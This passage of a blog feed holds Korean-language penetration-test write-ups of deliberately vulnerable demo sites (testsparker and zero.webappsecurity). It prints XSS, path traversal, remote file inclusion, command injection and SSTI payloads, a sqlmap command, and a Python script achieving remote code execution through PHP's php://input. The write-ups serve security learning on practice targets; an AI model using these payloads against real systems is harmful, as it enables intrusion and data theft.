+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON OS: Windows Server WAS: IIS/8.5 Lang: ASP.NET/4.0.30319 Information Leakage 서버 에러를 유도하는 값을 전달하여 반환하는 페이지에서 서버 설정 관련 정보를 획득할 수 있으며 2차 공격으로 이어질수있음 http://aspnet.testsparker.com/Help.aspx?item=./Default.aspx http://aspnet.testsparker.com/test XSS 사용자 입력값이 고대로 반환되는 페이지가 존재 https://aspnet.testsparker.com/About.aspx?hello=test 스크립트 구문을 삽입하면 https://aspnet.testsparker.com/About.aspx?hello=visitor&lt;script&gt;alert(1)&lt;/script&gt; 스크립트 실행 Directory Indexing 서버 내 ‘디렉토리 인덱싱’이 활성화된 디렉토리를 발견, 내부 파일 정보가 노출 http://aspnet.testsparker.com/statics/ Path Traversal 사용자로부터 서버 내 특정 페이지를 입력받는 기능이 존재 http://aspnet.testsparker.com/Help.aspx?item=help-konu1.html 이때, 서버 중요 파일의 경로를 전달하여 데이터를 읽음 ?item=../../../Windows/System32/drivers/etc/hosts Cleartext Transmission 로그인 페이지에서 http://aspnet.testsparker.com/administrator/Login.aspx 평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음) Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습 1시간 경과 모습 SQLi 판매상품 정보를 불러오는 페이지가 존재 http://aspnet.testsparker.com/Products.aspx?pId=4 SQL 문자(‘) 삽입 시 에러반환을 하는 것을 보니 SQLi에 취약한 가능성이 보임 ?pId=' sqlmap 도구를 이용하여 SQLi 시작 DB정보 획득를 한 모습 python sqlmap.py -u "http://aspnet.testsparker.com/Products.aspx?pId=1" --dbs ___ __H__ ___ ___["]_____ ___ ___ {1.6.11.10#dev} |_ -| . ["] | .'| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| https://sqlmap.org web server operating system: Windows 2012 R2 or 8.1 web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.5 back-end DBMS: Microsoft SQL Server 2014 available databases [6]: [*] ASPState [*] master [*] model [*] msdb [*] tempdb [*] testsparker ETC Unvalidated Redirect 도메인을 신뢰하고 있는 사용자는 아래 URL 링크 클릭할수있고 본인의 의도와 다르게 공격자의 피싱서버에 접속할수있음 http://aspnet.testsparker.com/redirect.aspx?site=warning.or.kr Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - php.testsparker.com</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-php.testsparker.com/" rel="alternate" type="text/html" title="[ VulnWebs ] - php.testsparker.com" /><published>2022-11-29T00:00:00+09:00</published><updated>2022-11-29T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-php.testsparker.com</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-php.testsparker.com/"><![CDATA[<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482397-efc20268-cebb-4414-a668-e44cb8b9aa7b.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207833806-d4cf32af-1f14-4fb4-b540-b841c6318bd2.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server: Apache/2.2.8 (Win32) PHP/5.2.6
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205216116-ae05e95b-5c2a-4d3f-90ba-e699bd8ec90f.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/robots.txt
+</code></pre></div></div>
+<h2 id="position-leakage">Position Leakage</h2>
+<h3 id="position-leakage-1">Position Leakage-1</h3>
+<p>서버의 ‘기본 파일’들이 불필요하게 외부에 공개되어 있어 2차 공격에 참고될 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/phpinfo.php
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205564597-85e4ea32-73ae-41d1-9359-367c14830f4c.png" alt="image" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/.svn/all-wcprops
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207520434-83c318e8-e2f8-4889-98d8-9731d8e1e9c9.png" alt="image" /></p>
+
+<h3 id="position-leakage-2">Position Leakage-2</h3>
+<p>개발자가 만들어둔 ‘백업 파일’에서 부분 소스코드가 노출되고 있어 2차 공격에 참고될 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/process.bak
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207520936-0974e1e6-58c6-48db-97e5-272bb63bbf76.png" alt="image" /></p>
+
+<h2 id="path-traversal">Path Traversal</h2>
+<p>웹서버 내 파일을 include하는 페이지가 존재 <strong><em>(LFI)</em></strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/process.php?file=Generics/index.nsp
+</code></pre></div></div>
+<p>아래 파일을 요청해보았으나 응답x</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=index.php
+</code></pre></div></div>
+<p>사용자 입력값을 검사하여 문자열 끝에 확장자 <strong><em>.nsp</em></strong>가 존재하는 지 검증하고 있는 것으로 보임</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>		
+            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
+            <span class="k">if</span><span class="p">(</span><span class="nf">EndsWith</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">".nsp"</span><span class="p">))</span>
+                <span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>따라서, 입력 문자열(index.php) 끝에 <strong><em>null</em></strong>을 삽입하여(index.php%00.nsp) 우회를 시도</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=index.php%00.nsp
+</code></pre></div></div>
+<p>정상적으로 파일을 불러왔고, 웹서버 내 hosts파일을 읽기위한 페이로드는 아래와 같음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=../../../../../Windows/System32/drivers/etc/hosts%00.nsp
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205557577-ca9ebae1-bc09-4556-ae90-04464df65c64.png" alt="image" /></p>
+
+<p>추가로 다음 php wrapper을 통해서 읽을수도있고</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///Windows/System32/drivers/etc/hosts%00.nsp
+</code></pre></div></div>
+<p>외부 파일을 include시킬수도 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=http://xss.rocks/xss.js%00.nsp
+</code></pre></div></div>
+
+<h2 id="rce">RCE</h2>
+<p>LFI 취약점을 통해 RCE까지 가능, 아래는 직접 작성한 파이썬 <strong><em>Attack Script</em></strong> 이며 웹서버에 임의 명령어를 실행시킬수있음 <br />ex) cmd: ipconfig</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://php.testsparker.com/process.php?file=php://input%00.nsp'</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="s">'ipconfig'</span> <span class="c1">#명령어 실행가능 'dir c:\', 'whoami', ...
+</span><span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'&lt;?php system("</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">"); ?&gt;'</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'&lt;123&gt;'</span><span class="o">+</span><span class="n">data</span><span class="o">+</span><span class="s">'&lt;/456&gt;'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">'(?&lt;=\&lt;123&gt;)(.*?)(?=&lt;\/456&gt;)'</span><span class="p">,</span><span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>입력한 명령어가 실행되어 실제 서버의 내부 IP를 반환하고있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows IP Configuration
+
+Ethernet adapter Local Area Connection:
+   Connection-specific DNS Suffix  . : ec2.internal
+   IPv4 Address. . . . . . . . . . . : 172.30.0.251
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.30.0.1
+
+Tunnel adapter isatap.ec2.internal:
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : ec2.internal
+
+Tunnel adapter Local Area Connection* 9:
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+</code></pre></div></div>
+
+<p>참조: https://book.hacktricks.xyz/pentesting-web/file-inclusion#input</p>
+
+<h2 id="xss">XSS</h2>
+<h3 id="xss-1">XSS-1</h3>
+<p>외부 JS 파일을 include하는 페이지가 존재함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/products.php?pro=url
+</code></pre></div></div>
+<p>외부스크립트 주소를 전달하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pro=http://xss.rocks/xss.js
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205547024-87ee7e05-826b-4d42-9e7a-1195c65b033a.png" alt="image" /></p>
+
+<p>외부 스크립트가 페이지 내에 삽입되어 스크립트 실행
+<img src="https://user-images.githubusercontent.com/56434196/205547152-6d4b49ab-7880-4b0d-a068-69ec32f3dfde.png" alt="image" /></p>
+
+<p>xss.js 파일 내용은 아래와 같음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+</code></pre></div></div>
+
+<h3 id="xss-2">XSS-2</h3>
+<p>로그인 이후 아래 검색페이지에 접속하면 사용자의 입력값을 고대로 반환해준다</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/auth/xss.php?search=test
+</code></pre></div></div>
+<p>아래 스크립트를 전송하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?search=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+
+<p>스크립트가 실행됨
+<img src="https://user-images.githubusercontent.com/56434196/205549233-4c621fc6-b29e-47e9-916c-7b6e9a555388.png" alt="image" /></p>
+
+<h3 id="xss-3">XSS-3</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/artist.php?id=test
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205216671-e7e77d48-fd9f-40fe-92bc-93d5f5387045.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205216795-162ae03a-5e8c-46e7-9054-b1189cf50700.png" alt="image" /></p>
+
+<h3 id="xss-4">XSS-4</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://aspnet.testinvicti.com/About.aspx?hello=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<h3 id="xss-5">XSS-5</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/hello.php?hpp=&lt;script&gt;alert(1)&amp;pp=&lt;/script&gt;
+</code></pre></div></div>
+<h3 id="xss-6">XSS-6</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/products.php?pro="&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
+
+<h2 id="directory-indexing">Directory Indexing</h2>
+<p>임의로 ‘test’ 입력했을 때, 디렉토리 인덱싱을 발견</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/test/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205217973-6612e39c-7294-4edb-a034-ae3632e7032d.png" alt="image" /></p>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음<br />(인코딩 및 암호화되지 않음)
+<img src="https://user-images.githubusercontent.com/56434196/205547931-a5fb06f4-b726-4d3a-a4d9-652a4864d066.png" alt="image" /></p>
+
+<h2 id="insufficient-session-expiration">Insufficient Session Expiration</h2>
+<p>‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음
+<br />로그인 직후 모습 
+<img src="https://user-images.githubusercontent.com/56434196/207769745-be6e68c3-b127-48fe-8ebc-b9daa3028200.png" alt="image" /></p>
+
+<p>1시간 경과 모습
+<img src="https://user-images.githubusercontent.com/56434196/207769821-bbf7ba18-84f3-44da-a2d2-344fbb8d89f6.png" alt="image" /></p>
+
+<h2 id="os-command-execution">OS Command Execution</h2>
+<p>nslookup 서비스를 지원하는 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/nslookup.php
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207524104-8fe85680-b5f5-49b9-a91f-25a38c8b1946.png" alt="image" /></p>
+
+<p>사용자가 입력한 IP에 대한 도메인 정보를 출력해주는 것이 정상 프로세스이나 공격자는 별도의 명령어를 추가로 실행할 수 있다
+<br />
+<strong><em>&amp;&amp;</em></strong> : 파이프라인
+<br />
+<strong><em>%SystemRoot%</em></strong> : C:\Windows</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' &amp;&amp; type %SystemRoot%\\win.ini &amp;&amp; '
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207524759-196540a8-38c4-4288-8698-67fcc27b0a18.png" alt="image" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp; ping -n 16 localhost &amp;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207525597-1a39fa1e-7c83-4ca3-bed3-949d0c87cd6a.png" alt="image" /></p>
+
+<h2 id="etc">ETC</h2>
+<h3 id="code-injection">Code Injection</h3>
+<p>자동점검 결과 특정 함수가 처리되는 페이지를 찾았고</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/hello.php?name=
+</code></pre></div></div>
+<p>아래 값을 삽입하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?name=';sleep(5);#
+</code></pre></div></div>
+<p>슬립함수 5초를 지정한대로 응답시간이 늦춰진것을 볼수있다
+<img src="https://user-images.githubusercontent.com/56434196/207522805-25d67349-22d1-47df-8920-2a564e150e51.png" alt="image" /></p>
+
+<h3 id="server-side-template-injection">Server Side Template Injection</h3>
+<p>서버 내 ‘템플릿’ 페이지가 존재함 (자동점검 툴을 통해 식별)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/artist.php?id=
+</code></pre></div></div>
+<p>아래 값을 전달하면<br />
+<img src="https://user-images.githubusercontent.com/100695923/207839810-b6cce6d9-9f98-41c8-b731-447c47534712.png" alt="image" /></p>
+
+<p>응답페이지에서 연산이 수행된 결과를 반환하고 있다
+<img src="https://user-images.githubusercontent.com/56434196/207749118-a46e82c0-d2ab-47a6-9d3f-59a984961b29.png" alt="image" /></p>
+
+<p>이는, 사용자의 입력이 서버 측에서 템플릿 ‘랜더링’ 된다는 뜻이다, 연산이 실행되었으니 어쩌면 코드실행도??
+<img src="https://user-images.githubusercontent.com/100695923/207839270-fefdb304-7479-4479-832b-e73cad35b489.png" alt="image" /></p>
+
+<p>서버 측에서 명령어 ‘whoami’가 실행되어 반환된 모습이다 (SSTI2RCE)
+<img src="https://user-images.githubusercontent.com/56434196/207749805-c47e56e3-c55e-4aba-8e48-6807a1a1b050.png" alt="image" /></p>
+
+<p>참고: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php</p>
+
+<p><br />
+<br />
+<br />
+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON Server: Apache/2.2.8 (Win32) PHP/5.2.6 http://php.testsparker.com/robots.txt Position Leakage Position Leakage-1 서버의 ‘기본 파일’들이 불필요하게 외부에 공개되어 있어 2차 공격에 참고될 수 있음 http://php.testsparker.com/phpinfo.php http://php.testsparker.com/.svn/all-wcprops Position Leakage-2 개발자가 만들어둔 ‘백업 파일’에서 부분 소스코드가 노출되고 있어 2차 공격에 참고될 수 있음 http://php.testsparker.com/process.bak Path Traversal 웹서버 내 파일을 include하는 페이지가 존재 (LFI) http://php.testsparker.com/process.php?file=Generics/index.nsp 아래 파일을 요청해보았으나 응답x ?file=index.php 사용자 입력값을 검사하여 문자열 끝에 확장자 .nsp가 존재하는 지 검증하고 있는 것으로 보임 &lt;?php $file = $_REQUEST["file"]; if(EndsWith($file,".nsp")) include $_REQUEST["file"]; ?&gt; 따라서, 입력 문자열(index.php) 끝에 null을 삽입하여(index.php%00.nsp) 우회를 시도 ?file=index.php%00.nsp 정상적으로 파일을 불러왔고, 웹서버 내 hosts파일을 읽기위한 페이로드는 아래와 같음 ?file=../../../../../Windows/System32/drivers/etc/hosts%00.nsp 추가로 다음 php wrapper을 통해서 읽을수도있고 ?file=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///Windows/System32/drivers/etc/hosts%00.nsp 외부 파일을 include시킬수도 있음 ?file=http://xss.rocks/xss.js%00.nsp RCE LFI 취약점을 통해 RCE까지 가능, 아래는 직접 작성한 파이썬 Attack Script 이며 웹서버에 임의 명령어를 실행시킬수있음 ex) cmd: ipconfig import requests import re url = 'http://php.testsparker.com/process.php?file=php://input%00.nsp' cmd = 'ipconfig' #명령어 실행가능 'dir c:\', 'whoami', ... data = f'&lt;?php system("{cmd}"); ?&gt;' r = requests.post(url, data='&lt;123&gt;'+data+'&lt;/456&gt;') p = re.compile('(?&lt;=\&lt;123&gt;)(.*?)(?=&lt;\/456&gt;)',re.DOTALL) res = ''.join(p.findall(r.text)) print(res) 입력한 명령어가 실행되어 실제 서버의 내부 IP를 반환하고있음 Windows IP Configuration Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : ec2.internal IPv4 Address. . . . . . . . . . . : 172.30.0.251 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 172.30.0.1 Tunnel adapter isatap.ec2.internal: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : ec2.internal Tunnel adapter Local Area Connection* 9: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : 참조: https://book.hacktricks.xyz/pentesting-web/file-inclusion#input XSS XSS-1 외부 JS 파일을 include하는 페이지가 존재함 http://php.testsparker.com/products.php?pro=url 외부스크립트 주소를 전달하면 ?pro=http://xss.rocks/xss.js 외부 스크립트가 페이지 내에 삽입되어 스크립트 실행 xss.js 파일 내용은 아래와 같음 document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie); alert ("This is remote text via xss.js located at xss.rocks " + document.cookie); XSS-2 로그인 이후 아래 검색페이지에 접속하면 사용자의 입력값을 고대로 반환해준다 http://php.testsparker.com/auth/xss.php?search=test 아래 스크립트를 전송하면 ?search=&lt;script&gt;alert(document.domain)&lt;/script&gt; 스크립트가 실행됨 XSS-3 http://php.testsparker.com/artist.php?id=test ?id=&lt;script&gt;alert(document.domain)&lt;/script&gt; XSS-4 http://aspnet.testinvicti.com/About.aspx?hello=&lt;script&gt;alert(document.domain)&lt;/script&gt; XSS-5 http://php.testsparker.com/hello.php?hpp=&lt;script&gt;alert(1)&amp;pp=&lt;/script&gt; XSS-6 http://php.testsparker.com/products.php?pro="&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; Directory Indexing 임의로 ‘test’ 입력했을 때, 디렉토리 인덱싱을 발견 http://php.testsparker.com/test/ Cleartext Transmission 평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음) Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습 1시간 경과 모습 OS Command Execution nslookup 서비스를 지원하는 페이지가 존재 http://php.testsparker.com/nslookup.php 사용자가 입력한 IP에 대한 도메인 정보를 출력해주는 것이 정상 프로세스이나 공격자는 별도의 명령어를 추가로 실행할 수 있다 &amp;&amp; : 파이프라인 %SystemRoot% : C:\Windows ' &amp;&amp; type %SystemRoot%\\win.ini &amp;&amp; ' &amp; ping -n 16 localhost &amp; ETC Code Injection 자동점검 결과 특정 함수가 처리되는 페이지를 찾았고 http://php.testsparker.com/hello.php?name= 아래 값을 삽입하면 ?name=';sleep(5);# 슬립함수 5초를 지정한대로 응답시간이 늦춰진것을 볼수있다 Server Side Template Injection 서버 내 ‘템플릿’ 페이지가 존재함 (자동점검 툴을 통해 식별) http://php.testsparker.com/artist.php?id= 아래 값을 전달하면 응답페이지에서 연산이 수행된 결과를 반환하고 있다 이는, 사용자의 입력이 서버 측에서 템플릿 ‘랜더링’ 된다는 뜻이다, 연산이 실행되었으니 어쩌면 코드실행도?? 서버 측에서 명령어 ‘whoami’가 실행되어 반환된 모습이다 (SSTI2RCE) 참고: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - zero.webappsecurity.com</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-zero.webappsecurity.com/" rel="alternate" type="text/html" title="[ VulnWebs ] - zero.webappsecurity.com" /><published>2022-11-28T00:00:00+09:00</published><updated>2022-11-28T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-zero.webappsecurity.com</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-zero.webappsecurity.com/"><![CDATA[<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482312-bd8feb5d-2913-4d83-aad7-db43650f3d80.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207833519-fbaf918b-5ee5-400b-bfe3-9b67ec85465b.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<p><img src="https://user-images.githubusercontent.com/56434196/205532243-074b9a74-85ed-474c-8e76-047e44b06bf5.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAS: Apache
+Lang: JSP
+</code></pre></div></div>
+
+<h2 id="information-leakage">Information Leakage</h2>
+<p>서버 내 미존재 페이지를 접속할 경우 ‘404’ 에러코드를 반환하면서 WAS정보를 노출</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/robots.txt
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205204536-77b442f2-6c45-424f-994c-0bc57c8a64bc.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Apache Tomcat : 7.0.70
+</code></pre></div></div>
+<h2 id="admin-page-discloser">Admin Page Discloser</h2>
+<p>관리자페이지가 쉽게 유추가능하고 접속됨</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/admin/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205204804-74c98024-0d5b-47eb-bbc4-fdfcd565e84c.png" alt="image" /></p>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음
+<br />(인코딩 및 암호화되지 않음)
+<img src="https://user-images.githubusercontent.com/56434196/205530081-16e8c516-447a-4fcd-a012-49c1c37a1d2f.png" alt="image" /></p>
+
+<h2 id="position-leakage">Position Leakage</h2>
+<h3 id="position-leakage-1">Position Leakage-1</h3>
+<p>Apache Tomcat이 제공하는 ‘관리자 인터페이스’ 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/manager/html
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/56434196/205793441-70673c44-8dae-48e2-9aef-7da79a723267.png" alt="image" /></p>
+
+<h3 id="position-leakage-2">Position Leakage-2</h3>
+<p>서버의 ‘기본 파일’들이 불필요하게 외부에 공개되어 있어 2차 공격에 참고될 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/docs/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207514216-5371ab43-dd3b-4e45-8880-a29048af6d38.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/errors/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207514315-36ee61f0-a169-49c0-a5a0-3b12e8b2251d.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/server-status
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207514516-40bafe35-95e9-49c4-96e2-61b036843113.png" alt="image" /></p>
+
+<h3 id="position-leakage-3">Position Leakage-3</h3>
+<p>개발자가 만들어둔 ‘백업 파일’에서 부분 소스코드가 노출되고 있어 2차 공격에 참고될 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/faq.html.bak
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/index.old
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/index.html.old	
+</code></pre></div></div>
+
+<h2 id="path-traversal">Path Traversal</h2>
+<p>특정 파일을 오리지널 페이지에 include하는 기능이 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://zero.webappsecurity.com/help.html?topic=/help/topic1.html
+</code></pre></div></div>
+<p>외부 파일을 포함시킬 경우 (RFI)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?topic=http://xss.rocks/xss.js
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207511770-6bcb5287-e96c-4a05-ba81-ea30a333d4d7.png" alt="image" /></p>
+
+<p>서버 내 파일을 포함시킬 경우 (LFI)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?topic=/WEB-INF/web.xml
+or
+?topic=file://../../WEB-INF/web.xml
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207513201-9cbb4b80-4997-4ec5-861a-9c74cda066fd.png" alt="image" /></p>
+
+<p><br />
+<br />
+<br />
